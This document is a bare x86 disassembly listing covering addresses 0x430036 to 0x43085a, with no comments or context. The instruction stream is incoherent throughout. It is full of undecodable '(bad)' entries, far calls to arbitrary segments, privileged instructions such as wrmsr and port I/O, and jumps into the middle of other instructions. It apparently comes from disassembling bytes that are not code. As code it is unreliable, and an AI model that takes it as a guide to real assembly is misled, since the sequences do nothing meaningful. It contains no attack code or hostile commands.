  430036:	retf   
  430037:	(bad)  
  430038:	enter  0x4d45,0xb8
  43003c:	mov    esi,DWORD PTR [esp+esi*8]
  43003f:	test   ebx,ecx
  430041:	pushf  
  430042:	enter  0x4df8,0x8b
  430046:	mov    DWORD PTR [ebp+0x8],0x894708
  43004d:	inc    ebp
  43004e:	mov    ebp,0xff8bfffc
  430053:	dec    ebp
  430054:	mov    ch,0xf4
  430056:	call   DWORD PTR [ebx-0x1]
  430059:	mov    ebx,0x8005322
  43005e:	call   DWORD PTR [ecx+0x8]
  430061:	pop    es
  430062:	jmp    0xb8:0x9cb4533
  430069:	call   0xc3:0x32f4728b
  430070:	call   0x8989:0x3c83203
  430077:	dec    ebp
  430078:	or     ah,al
  43007a:	inc    ebp
  43007b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430081:	xor    eax,DWORD PTR [eax]
  430083:	retf   
  430084:	ret    
  430085:	add    eax,esi
  430087:	enter  0x8945,0x64
  43008b:	dec    ebp
  43008c:	sbb    ah,cl
  43008e:	add    BYTE PTR [ebx-0xb87b277],cl
  430094:	dec    DWORD PTR [ebx-0xbcfb275]
  43009a:	test   DWORD PTR [ebx],esi
  43009c:	dec    ebx
  43009e:	inc    DWORD PTR [ebx]
  4300a0:	inc    eax
  4300a1:	enter  0x8989,0x64
  4300a5:	(bad)  
  4300a6:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4300aa:	cld    
  4300ab:	dec    DWORD PTR [ebp-0xa90001]
  4300b1:	push   edi
  4300b2:	mov    BYTE PTR [edx+0x1],ch
  4300b5:	and    BYTE PTR [eax],al
  4300b7:	pop    ecx
  4300b8:	inc    ebp
  4300b9:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4300bf:	push   0xffffff89
  4300c1:	pop    ecx
  4300c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4300c3:	dec    ebp
  4300c4:	add    BYTE PTR [ecx+0x45fc088b],cl
  4300ca:	jne    0x430114
  4300cc:	lea    eax,[eax]
  4300ce:	fs (bad) 
  4300d0:	dec    DWORD PTR [eax]
  4300d2:	mov    DWORD PTR [eax],eax
  4300d4:	test   al,0x0
  4300d6:	add    BYTE PTR [ebp-0x18],cl
  4300d9:	xor    ebp,DWORD PTR [edx]
  4300db:	add    eax,DWORD PTR [eax]
  4300dd:	mov    eax,eax
  4300df:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4300e6:	inc    ebp
  4300e7:	mov    DWORD PTR [ebx+0x459408],ecx
  4300ed:	popa   
  4300ee:	mov    esp,DWORD PTR [ebp-0x75]
  4300f1:	(bad)  
  4300f2:	cld    
  4300f3:	inc    eax
  4300f4:	cmp    bh,0x1
  4300f7:	lea    eax,[eax]
  4300f9:	and    BYTE PTR [eax],al
  4300fb:	inc    DWORD PTR [ecx-0x18]
  4300fe:	mov    ecx,DWORD PTR [ebx]
  430100:	cld    
  430101:	add    BYTE PTR [ecx+0x75014d],cl
  430107:	(bad)  
  430108:	xchg   ebp,eax
  430109:	sar    bh,1
  43010b:	inc    eax
  43010c:	inc    DWORD PTR [eax]
  43010e:	mov    eax,DWORD PTR [ebp-0x4]
  430111:	xor    edx,DWORD PTR [edx+0x7201be]
  430117:	add    BYTE PTR [edx],dl
  430119:	(bad)  
  43011a:	nop
  43011b:	inc    ebp
  43011c:	add    BYTE PTR [ebx-0x5afb0c00],cl
  430122:	mov    al,0xff
  430124:	add    bh,bh
  430126:	add    BYTE PTR [ebx],dh
  430128:	inc    DWORD PTR [ebx]
  43012a:	sbb    al,0x89
  43012c:	jne    0x43010a
  43012e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430134:	mov    eax,DWORD PTR [ebp-0xff0048]
  43013a:	mov    DWORD PTR [eax-0x70],0xee70e989
  430141:	inc    DWORD PTR [ebp-0x75]
  430144:	(bad)  [esp+ebp*8]
  430147:	test   DWORD PTR [esi-0x1],esp
  43014a:	inc    ebp
  43014b:	(bad)  
  43014c:	aas    
  43014d:	inc    ebp
  43014e:	(bad)  
  43014f:	lea    edi,[eax+edi*2-0x1]
  430153:	inc    edi
  430155:	mov    DWORD PTR [ecx],edi
  430157:	mov    al,ds:0x8b8000c7
  43015c:	out    dx,al
  43015d:	cld    
  43015e:	loopne 0x4300ed
  430160:	inc    ebp
  430161:	(bad)  
  430162:	in     al,dx
  430163:	(bad)  
  430164:	fisttp WORD PTR [eax+0x8801c7]
  43016a:	jecxz  0x4301b1
  43016c:	out    dx,al
  43016d:	inc    DWORD PTR [ebp-0x4]
  430170:	out    0x8d,eax
  430172:	aas    
  430173:	(bad)  
  430174:	call   0xcb2c78
  430179:	add    DWORD PTR [ebx-0x7f590400],ecx
  43017f:	add    BYTE PTR [ecx],al
  430181:	test   DWORD PTR [eax],eax
  430183:	wrmsr  
  430185:	jae    0x430172
  430187:	add    BYTE PTR [eax],al
  430189:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43018f:	add    esp,edi
  430191:	add    BYTE PTR [eax+0x450108],al
  430197:	mov    edi,DWORD PTR [ebp-0x6c]
  43019a:	add    DWORD PTR [eax],0x4
  43019d:	mov    eax,DWORD PTR [ebp+0x3]
  4301a0:	mov    edi,DWORD PTR [esp+edi*8]
  4301a3:	dec    ebp
  4301a4:	nop
  4301a5:	mov    eax,DWORD PTR [ecx]
  4301a7:	fadd   DWORD PTR [eax]
  4301a9:	add    BYTE PTR [ecx*4-0xafa000],al
  4301b0:	inc    ebp
  4301b1:	push   edx
  4301b2:	call   DWORD PTR [ebp-0x7b]
  4301b5:	mov    esi,DWORD PTR [ebp-0x74]
  4301b8:	mov    eax,DWORD PTR [eax]
  4301ba:	cld    
  4301bb:	mov    eax,DWORD PTR [eax+0x880103]
  4301c1:	add    BYTE PTR [ebp+0x6a],bh
  4301c4:	cmp    edi,0x10
  4301c7:	mov    WORD PTR [ebp+0x0],es
  4301ca:	mov    edx,DWORD PTR [edx-0x4]
  4301cd:	push   ecx
  4301ce:	nop
  4301cf:	inc    DWORD PTR [ecx]
  4301d1:	cld    
  4301d2:	add    BYTE PTR [ebp-0x26],bh
  4301d5:	mov    eax,DWORD PTR [eax]
  4301d7:	cld    
  4301d8:	push   eax
  4301d9:	nop
  4301da:	inc    ebp
  4301db:	add    edi,edi
  4301dd:	add    BYTE PTR [ebx+0x4de0f445],cl
  4301e3:	call   0x9446c91b
  4301e8:	cmp    esp,ebx
  4301ea:	movntq QWORD PTR [esi],mm6
  4301ed:	mov    DWORD PTR [eax],0xb87c8b98
  4301f3:	test   ebx,eax
  4301f5:	jmp    DWORD PTR [esi-0x1]
  4301f8:	int    0xe9
  4301fa:	sub    esp,esp
  4301fc:	add    eax,DWORD PTR [ebp-0x30]
  4301ff:	fild   WORD PTR [ebp+0x3f]
  430202:	cmp    eax,edi
  430204:	je     0xc243e626
  43020a:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  430211:	(bad)  
  430212:	jne    0x4301a0
  430214:	mov    ebx,ecx
  430216:	cld    
  430217:	jl     0x43025e
  430219:	cmp    DWORD PTR [ebx+0x50b400],ecx
  43021f:	inc    ebp
  430220:	call   0xeb2bb0
  430225:	add    BYTE PTR [ebx-0x7f170301],cl
  43022b:	add    DWORD PTR es:[eax],eax
  43022e:	add    al,al
  430230:	xor    BYTE PTR [eax+0x3f],dl
  430233:	inc    ebp
  430234:	add    BYTE PTR [ebx+0xfcd88b],cl
  43023a:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430240:	add    DWORD PTR [ecx+0x458be845],ecx
  430246:	fmul   DWORD PTR [ebx+0x8bb800]
  43024c:	cld    
  43024d:	call   0xd82d12
  430252:	dec    DWORD PTR [ebx+0x108ee8ff]
  430258:	add    al,al
  43025a:	push   eax
  43025b:	es inc ebp
  43025d:	inc    ebp
  43025e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430264:	dec    DWORD PTR [ebx-0x3ff70301]
  43026a:	mov    DWORD PTR gs:[eax],eax
  43026d:	call   0x8b6b4832
  430272:	inc    ebp
  430273:	mov    eax,0xe8d8008b
  430278:	add    BYTE PTR [ecx],ch
  43027a:	mov    eax,DWORD PTR [eax]
  43027c:	cld    
  43027d:	mov    eax,eax
  43027f:	call   0x462b12d9
  430284:	sub    DWORD PTR [ebx-0x3c743000],ecx
  43028a:	cld    
  43028b:	mov    BYTE PTR [eax+0x8401c1],0x1
  430292:	xor    BYTE PTR [eax],al
  430294:	push   edi
  430295:	inc    ebp
  430296:	mov    DWORD PTR [ebx],esi
  430298:	in     al,0xb9
  43029a:	inc    ebp
  43029b:	lea    ecx,[ebx-0x3c370301]
  4302a1:	dec    ebp
  4302a2:	call   0x8dc1:0x308328b
  4302a9:	xchg   DWORD PTR [eax+0x1],eax
  4302ac:	inc    DWORD PTR [eax]
  4302ae:	call   0x432bf8
  4302b3:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4302b9:	jge    0x4302ee
  4302bb:	mov    eax,DWORD PTR [ebx]
  4302bd:	cld    
  4302be:	lea    edx,[eax+0xff0120]
  4302c4:	call   0x432c56
  4302c9:	push   eax
  4302ca:	inc    DWORD PTR [ebp-0x1c]
  4302cd:	mov    ecx,DWORD PTR [ebp-0x58]
  4302d0:	xor    eax,DWORD PTR [eax]
  4302d2:	add    edi,edi
  4302d4:	cmp    ebp,eax
  4302d6:	jne    0x4302fe
  4302d8:	mov    DWORD PTR [eax],0x8b004dd8
  4302de:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4302e5:	mov    eax,ebx
  4302e7:	cld    
  4302e8:	test   BYTE PTR [eax+0x32019a],bh
  4302ee:	mov    DWORD PTR [ebp+0x8],esi
  4302f1:	xor    eax,DWORD PTR [ebp-0x73]
  4302f4:	test   DWORD PTR [esp+esi*2-0x1],edi
  4302f8:	mov    ebp,eax
  4302fa:	mov    eax,0x33004d29
  4302ff:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  430305:	add    DWORD PTR [eax],eax
  430307:	add    BYTE PTR [ebp+0x30],al
  43030a:	mov    edx,DWORD PTR [edi-0x48]
  43030d:	add    ebx,0xffffffe4
  430310:	test   bp,cx
  430313:	je     0x430340
  430315:	mov    eax,DWORD PTR [ebx]
  430317:	cld    
  430318:	sar    BYTE PTR [eax+0x3b0145],1
  43031e:	pcmpeqw mm4,mm6
  430321:	xor    edi,edi
  430323:	lea    ecx,[ebx-0x239e7470]
  430329:	add    BYTE PTR [ebp+0x50],cl
  43032c:	cmp    eax,DWORD PTR [ebp+0x75]
  43032f:	mov    ebp,DWORD PTR [eax-0x68]
  430332:	test   DWORD PTR [eax],eax
  430334:	clc    
  430335:	push   DWORD PTR [ebp-0x1]
  430338:	lea    ecx,[eax]
  43033a:	int3   
  43033b:	inc    ebp
  43033c:	call   0xfb33cc
  430341:	jne    0x43033b
  430343:	xor    edi,DWORD PTR [ebp-0x41]
  430346:	jmp    0x4303ba
  430348:	mov    eax,DWORD PTR [eax]
  43034a:	mov    eax,0x339545c7
  43034f:	inc    DWORD PTR [ebx]
  430351:	push   DWORD PTR [ecx]
  430353:	xor    eax,0x50eb008b
  430358:	mov    eax,DWORD PTR [ebp-0x3c]
  43035b:	mov    eax,eax
  43035d:	cld    
  43035e:	clc    
  43035f:	ret    
  430360:	test   bh,al
  430362:	pop    es
  430363:	xchg   ebp,eax
  430364:	add    bh,bh
  430366:	inc    ebp
  430367:	dec    DWORD PTR [edi]
  430369:	pop    ds
  43036a:	sub    eax,DWORD PTR [eax]
  43036c:	add    BYTE PTR [eax+0x76],dl
  43036f:	push   ebp
  430370:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  430376:	or     al,0xcf
  430378:	inc    eax
  430379:	enter  0x745,0x72
  43037d:	inc    ebp
  43037e:	mov    eax,DWORD PTR [ecx]
  430380:	int3   
  430381:	add    BYTE PTR [ebp-0x75],al
  430384:	xor    eax,0xc74d9cb8
  430389:	xor    edx,eax
  43038b:	lea    eax,[ebp+0x4572f808]
  430391:	add    BYTE PTR [ebx-0x3c7423bb],cl
  430397:	fadd   st,st(6)
  430399:	rol    BYTE PTR [ebp+0x12],0x8b
  43039d:	inc    ebp
  43039e:	fmul   QWORD PTR [ebx-0x3c39233d]
  4303a4:	inc    ebp
  4303a5:	test   bh,al
  4303a7:	call   0xdcf8:0x898532f8
  4303ae:	inc    ebp
  4303af:	inc    ebp
  4303b0:	cmp    esi,DWORD PTR [ebx]
  4303b2:	pushf  
  4303b3:	mov    ecx,0xffb48dc7
  4303b8:	test   eax,ecx
  4303ba:	clc    
  4303bb:	dec    ebp
  4303bc:	inc    ebp
  4303bd:	mov    edi,DWORD PTR [ecx]
  4303bf:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  4303c6:	test   edi,edi
  4303c8:	clc    
  4303c9:	test   DWORD PTR [ebp+0x45],0x89c8b3f
  4303d0:	(bad)  
  4303d1:	enter  0x18e8,0x85
  4303d5:	xor    eax,0xff459cf8
  4303da:	mov    edi,esp
  4303dc:	lock inc ebp
  4303de:	ret    
  4303df:	push   eax
  4303e0:	(bad)  
  4303e1:	idiv   BYTE PTR [ebp+0x0]
  4303e4:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4303ea:	add    BYTE PTR [ebx],dl
  4303ec:	jmp    0xce053e
  4303f1:	les    eax,FWORD PTR [ebp-0x35]
  4303f4:	mov    ecx,esi
  4303f6:	lock or al,cl
  4303f9:	clc    
  4303fa:	inc    ebp
  4303fb:	add    esi,DWORD PTR [ebx]
  4303fd:	jge    0x430402
  4303ff:	xor    edi,DWORD PTR [ebx]
  430401:	cmp    ecx,DWORD PTR [edi]
  430403:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  430408:	mov    edi,DWORD PTR [ecx]
  43040a:	test   al,0xcc
  43040c:	dec    ebp
  43040d:	test   BYTE PTR [ebx],dh
  43040f:	pop    es
  430410:	xor    eax,DWORD PTR [eax]
  430412:	add    ecx,DWORD PTR [esi]
  430414:	add    ecx,eax
  430416:	psraw  mm0,mm1
  430419:	sub    BYTE PTR [ebp+0x38],cl
  43041c:	mov    edi,DWORD PTR [ebx]
  43041e:	lock int3 
  430420:	shl    edx,1
  430422:	rol    BYTE PTR [ebp+0xc],1
  430425:	mov    DWORD PTR [ebp-0x24],0xf8038533
  43042c:	jmp    0x770476
  430431:	pushf  
  430432:	inc    ebp
  430433:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  430439:	xor    ecx,ebx
  43043b:	add    ecx,esi
  43043d:	mov    esi,eax
  43043f:	enter  0x45af,0x8b
  430443:	xor    ecx,eax
  430445:	add    edx,DWORD PTR [ebp-0x77]
  430448:	sub    ecx,DWORD PTR [eax]
  43044a:	cmp    eax,DWORD PTR [ebp+0x77]
  43044d:	aad    0x8b
  43044f:	pushf  
  430450:	test   al,0xc7
  430452:	mov    DWORD PTR [eax-0x7747b00],ebp
  430458:	lods   al,BYTE PTR ds:[esi]
  430459:	inc    ebp
  43045a:	dec    ebp
  43045b:	cmp    dh,BYTE PTR [ebx]
  43045d:	pushf  
  43045e:	xor    eax,edi
  430460:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  430467:	inc    ebp
  430468:	dec    ebp
  430469:	cmp    BYTE PTR [ebx-0x2e380f64],cl
  43046f:	mov    esp,0xf80585d0
  430474:	inc    ebp
  430475:	inc    ebp
  430476:	jmp    0x4304b6
  430478:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43047f:	dec    ebp
  430480:	xor    esi,DWORD PTR [ebx]
  430482:	add    eax,DWORD PTR [ebx]
  430484:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43048a:	dec    ebp
  43048b:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430491:	out    dx,eax
  430492:	rol    BYTE PTR [eax],1
  430494:	add    eax,0xebc8458b
  430499:	dec    ebp
  43049a:	mov    ebp,DWORD PTR [ebx]
  43049c:	mov    esp,0x33f84d8b
  4304a1:	ret    
  4304a2:	xor    eax,esi
  4304a4:	add    ecx,eax
  4304a6:	add    eax,DWORD PTR [edx+0xc1010f]
  4304ac:	dec    ebp
  4304ad:	inc    ebp
  4304ae:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4304b4:	ror    bl,1
  4304b6:	add    eax,0xebc645ce
  4304bb:	scas   eax,DWORD PTR es:[edi]
  4304bc:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4304c2:	xor    ebp,DWORD PTR [ebx]
  4304c4:	xor    edi,DWORD PTR [ebx]
  4304c6:	add    esi,DWORD PTR [edi+0x3]
  4304c9:	mov    ecx,DWORD PTR [edi]
  4304cb:	clc    
  4304cc:	rol    ebx,0x4d
  4304cf:	(bad)  
  4304d0:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4304d7:	mov    ah,0x45
  4304d9:	dec    ebp
  4304da:	jbe    0x43050f
  4304dc:	mov    esi,DWORD PTR [ebx]
  4304de:	call   0x334651e6
  4304e3:	rdpmc  
  4304e5:	rol    DWORD PTR [ebx],0x4d
  4304e8:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4304ee:	inc    ebp
  4304ef:	ror    BYTE PTR [ebx+0x45450808],1
  4304f5:	jmp    0x10b0585
  4304fa:	inc    ebp
  4304fb:	inc    ebp
  4304fc:	(bad)  
  4304fd:	mov    ebx,eax
  4304ff:	clc    
  430500:	test   ebx,eax
  430502:	clc    
  430503:	retf   
  430504:	inc    ebp
  430505:	into   
  430506:	mov    esi,0x8b85afec
  43050c:	clc    
  43050d:	enter  0x5545,0x3b
  430511:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  430518:	ret    
  430519:	mov    ah,0xc6
  43051b:	addr16 push 0x338b4545
  430521:	clc    
  430522:	add    eax,ebx
  430524:	loopne 0x4304f1
  430526:	dec    ebp
  430527:	into   
  430528:	mov    al,dh
  43052a:	or     BYTE PTR [edi-0x37ff748e],ch
  430530:	inc    ebp
  430531:	push   ebp
  430532:	mov    ebp,DWORD PTR [ebx]
  430534:	in     al,dx
  430535:	cmp    eax,ebx
  430537:	ja     0x43057e
  430539:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  43053f:	inc    ebp
  430540:	call   0xd7c3:0x88f8328b
  430547:	retf   
  430548:	inc    ebp
  430549:	into   
  43054a:	mov    eax,esi
  43054c:	in     al,dx
  43054d:	scas   eax,DWORD PTR es:[edi]
  43054e:	retf   
  43054f:	mov    ecx,DWORD PTR [ebp-0x38]
  430552:	mov    edx,DWORD PTR [ebp-0x24]
  430555:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8866]
  43055c:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430563:	mov    eax,DWORD PTR [ebx]
  430565:	clc    
  430566:	loopne 0x43052b
  430568:	push   ebp
  430569:	retf   
  43056a:	mov    dh,al
  43056c:	adc    esi,ecx
  43056e:	jb     0x43051f
  430570:	add    BYTE PTR [ebx+0x558bc845],cl
  430576:	in     al,dx
  430577:	sub    eax,ebx
  430579:	cmp    ecx,ebx
  43057b:	mov    eax,esi
  43057d:	mov    esp,0x45af03ce
  430582:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  430588:	mov    eax,ebx
  43058a:	in     al,dx
  43058b:	into   
  43058c:	dec    ebp
  43058d:	(bad)  
  43058e:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430594:	rol    DWORD PTR [ebp+0x4d],0x89
  430598:	xor    esp,esp
  43059a:	sub    eax,DWORD PTR [ebp-0x75]
  43059d:	add    ebp,esp
  43059f:	mov    al,0x55
  4305a1:	inc    ebp
  4305a2:	xor    esi,DWORD PTR ds:0x890f9c03
  4305a8:	retf   0x55dc
  4305ab:	inc    ebp
  4305ac:	xor    esi,DWORD PTR [ebx+ebp*1]
  4305af:	pushf  
  4305b0:	(bad)  
  4305b1:	(bad)  
  4305b2:	adc    eax,eax
  4305b4:	jb     0x43053b
  4305b6:	add    al,bh
  4305b8:	enter  0x8645,0x33
  4305bc:	inc    DWORD PTR [ebx]
  4305be:	(bad)  
  4305bf:	jmp    0x430606
  4305c1:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4305c7:	inc    ebp
  4305c8:	(bad)  
  4305c9:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4305cf:	call   0xb4d:0x88c132cb
  4305d6:	lea    eax,[ebp+0x8]
  4305d9:	xor    esi,DWORD PTR [edx+0x3]
  4305dc:	add    al,ah
  4305de:	inc    ebp
  4305df:	dec    ebp
  4305e0:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4305e6:	data16 add ch,cl
  4305e9:	inc    ebp
  4305ea:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4305f0:	inc    ebp
  4305f1:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4305f7:	push   ebp
  4305f8:	(bad)  
  4305f9:	mov    BYTE PTR [edi+0xf723b11],ch
  4305ff:	add    ch,ch
  430601:	inc    ebp
  430602:	dec    DWORD PTR [ebx-0x34332775]
  430608:	add    al,0x4d
  43060a:	inc    ebp
  43060b:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  430611:	call   0xc000:0x8b003201
  430618:	add    BYTE PTR [ebp-0x1],cl
  43061b:	xor    ecx,esp
  43061d:	xor    eax,DWORD PTR [eax]
  43061f:	add    edx,DWORD PTR [eax+0x3]
  430622:	mov    DWORD PTR [edi],ecx
  430624:	call   0x4288c6ea
  430629:	mov    DWORD PTR [ebp-0x20],esp
  43062c:	add    BYTE PTR [ebp+0x7d],al
  43062f:	mov    eax,DWORD PTR [eax]
  430631:	in     al,0x15
  430633:	ret    
  430634:	iret   
  430635:	(bad)  
  430636:	enter  0x14af,0x8b
  43063a:	(bad)  
  43063b:	in     al,dx
  43063c:	or     bl,cl
  43063e:	adc    cl,al
  430640:	push   ebp
  430641:	dec    ebp
  430642:	inc    eax
  430643:	mov    edx,DWORD PTR [ebp-0x20]
  430646:	jb     0x430613
  430648:	mov    ecx,esi
  43064a:	cld    
  43064b:	scas   eax,DWORD PTR es:[edi]
  43064c:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430653:	mov    BYTE PTR [eax],0x8c
  430656:	push   0xffffff9a
  430658:	push   edi
  430659:	xor    dl,BYTE PTR [eax+0x3b]
  43065c:	mov    ecx,DWORD PTR [edi]
  43065e:	call   0x8c424bc1
  430663:	mov    eax,eax
  430665:	in     al,dx
  430666:	jge    0x4306b5
  430668:	mov    DWORD PTR [ebx],esi
  43066a:	int3   
  43066b:	add    eax,DWORD PTR [ebp+0xf]
  43066e:	xor    eax,ecx
  430670:	(bad)  
  430671:	dec    ebp
  430672:	pushf  
  430673:	xor    ecx,esp
  430675:	add    edi,DWORD PTR [edi]
  430677:	mov    eax,DWORD PTR [ebp-0x38]
  43067a:	aam    0x84
  43067c:	aam    0x9a
  43067e:	add    esi,DWORD PTR [edx]
  430680:	jmp    0x43060b
  430682:	mov    cl,al
  430684:	add    eax,0x14330f45
  430689:	mov    ecx,0xff458d80
  43068e:	jmp    0xc990165b
  430693:	mov    edx,ecx
  430695:	rol    BYTE PTR [ebp+0x330155],1
  43069b:	add    ecx,DWORD PTR [ebp+0xf]
  43069e:	xor    eax,edx
  4306a0:	(bad)  
  4306a1:	ror    DWORD PTR [eax],0x86
  4306a4:	jb     0x4306a3
  4306a6:	add    bh,bh
  4306a8:	clc    
  4306a9:	inc    ebp
  4306aa:	jb     0x430716
  4306ac:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4306b2:	xor    eax,0xc7d89c8b
  4306b7:	add    al,al
  4306b9:	push   0xf830c3
  4306be:	inc    ebp
  4306bf:	jne    0x4306f6
  4306c1:	push   0xffffff9c
  4306c3:	inc    edi
  4306c5:	adc    al,0xe8
  4306c7:	inc    ebp
  4306c8:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4306ce:	mov    ecx,DWORD PTR [eax]
  4306d0:	cld    
  4306d1:	or     DWORD PTR [ebp-0x34],0x33
  4306d5:	jbe    0x4306da
  4306d7:	mov    edx,DWORD PTR [ecx+0x2b]
  4306da:	dec    ebp
  4306db:	mov    cl,BYTE PTR [ebx+0x45d801]
  4306e1:	mov    BYTE PTR [ebx],dh
  4306e3:	mov    eax,DWORD PTR [ebx]
  4306e5:	or     BYTE PTR [ecx+0x3b],dl
  4306e8:	dec    ebp
  4306e9:	int3   
  4306ea:	xor    ebp,edi
  4306ec:	add    eax,DWORD PTR [ebp+0x51]
  4306ef:	mov    ecx,DWORD PTR [ebp-0x28]
  4306f2:	xor    eax,DWORD PTR [eax]
  4306f4:	add    ebp,DWORD PTR [eax+0x51]
  4306f7:	adc    BYTE PTR [eax+0x0],0x8b
  4306fb:	add    BYTE PTR [ebx+0x4d18fcff],cl
  430701:	inc    ebp
  430702:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  430708:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43070e:	dec    ebp
  43070f:	mov    esi,DWORD PTR [ebx]
  430711:	hlt    
  430712:	add    eax,ebx
  430714:	push   ecx
  430715:	inc    ebp
  430716:	dec    ebp
  430717:	aam    0xff
  430719:	aam    0xe4
  43071b:	(bad)  
  43071c:	retf   
  43071d:	mov    al,ds:0xc1ff39ce
  430722:	adc    al,0xc6
  430724:	inc    ebp
  430725:	and    eax,0x9c0f4c85
  43072a:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  430731:	cmp    BYTE PTR [ebx+0x39],0x0
  430735:	mov    dh,0xc7
  430737:	cmp    eax,eax
  430739:	jne    0x4543ff85
  43073f:	mov    edi,DWORD PTR [ebx]
  430741:	mov    eax,0x848bcb9c
  430746:	rcr    BYTE PTR [edx-0x7c7fcd0f],0x66
  43074d:	or     BYTE PTR [edi],cl
  43074f:	(bad)  
  430750:	dec    ebp
  430751:	inc    edi
  430752:	add    bh,0x53
  430755:	or     cl,ch
  430757:	test   DWORD PTR [eax+0x4d4501f8],ecx
  43075d:	xchg   BYTE PTR [eax-0x1638ac64],al
  430763:	mov    esp,0xf802b588
  430768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430769:	inc    ebp
  43076a:	(bad)  
  43076b:	cmp    edi,edi
  43076d:	pushf  
  43076e:	or     DWORD PTR [ecx+0x45ffe474],0x0
  430775:	mov    ecx,DWORD PTR [ebp-0x340018]
  43077b:	into   
  43077c:	dec    DWORD PTR [ebx-0x7f72431c]
  430782:	push   0x5000ff01
  430787:	retf   
  430788:	inc    ebp
  430789:	into   
  43078a:	dec    DWORD PTR [ebx-0x343f3ff4]
  430790:	push   eax
  430791:	into   
  430792:	call   0x4b0c22
  430797:	retf   
  430798:	add    dh,cl
  43079a:	add    bh,bh
  43079c:	mov    DWORD PTR [eax+ecx*1],edx
  43079f:	clc    
  4307a0:	inc    ebp
  4307a1:	inc    ebp
  4307a2:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4307a8:	push   0x1
  4307aa:	push   edi
  4307ab:	add    BYTE PTR [eax-0x35],dl
  4307ae:	mov    ecx,esi
  4307b0:	cld    
  4307b1:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4307b7:	into   
  4307b8:	ror    BYTE PTR [ebx+0x75000800],0x50
  4307bf:	xor    eax,DWORD PTR [ebp+0x3]
  4307c2:	jne    0x430815
  4307c4:	call   DWORD PTR [eax-0x3c]
  4307c7:	mov    DWORD PTR [ecx-0x18],edx
  4307ca:	mov    edi,edi
  4307cc:	call   0x8b464d55
  4307d1:	add    ah,ah
  4307d3:	rol    BYTE PTR [ebp-0x7c],0xeb
  4307d7:	add    edi,edi
  4307d9:	add    al,ch
  4307db:	inc    ebp
  4307dc:	push   ecx
  4307dd:	cmp    cl,BYTE PTR [ebx+0x45c7c49c]
  4307e3:	mov    al,0xc7
  4307e5:	test   esp,esp
  4307e7:	clc    
  4307e8:	test   DWORD PTR [ebp-0x8],ecx
  4307eb:	add    BYTE PTR [ebp+0x53],0x34
  4307ef:	jmp    0x8bcc9090
  4307f4:	in     al,dx
  4307f5:	or     BYTE PTR [ebp-0xf],al
  4307f8:	xor    eax,DWORD PTR [eax+0x4f896603]
  4307fe:	hlt    
  4307ff:	mov    eax,DWORD PTR [ebp-0x50]
  430802:	xor    esi,ecx
  430804:	add    eax,DWORD PTR [eax+0x4f086689]
  43080a:	inc    ebp
  43080b:	adc    ebp,0x68
  43080e:	pushf  
  43080f:	inc    edi
  430811:	add    al,ch
  430813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430814:	test   edi,edi
  430816:	clc    
  430817:	inc    DWORD PTR [ebp-0x73]
  43081a:	cmp    dh,BYTE PTR [esp+ebx*4-0x1]
  43081e:	(bad)  
  43081f:	push   ecx
  430820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430821:	jne    0x4307a8
  430823:	push   eax
  430824:	clc    
  430825:	test   DWORD PTR [ebp-0x1],eax
  430828:	cmp    bh,bh
  43082a:	pushf  
  43082b:	mov    eax,edi
  43082d:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  430834:	inc    ebp
  430835:	push   edi
  430836:	sbb    bl,BYTE PTR ds:[eax+eax*1-0x7f1b9775]
  43083e:	dec    ebp
  43083f:	add    BYTE PTR [ebx],dh
  430841:	inc    ebp
  430842:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430848:	enter  0x8401,0x0
  43084c:	add    al,BYTE PTR [eax]
  43084e:	add    bh,bh
  430850:	out    dx,eax
  430851:	sbb    BYTE PTR [eax],al
  430853:	dec    ebp
  430854:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  43085a:	sub    esi,DWORD PTR [ebx]
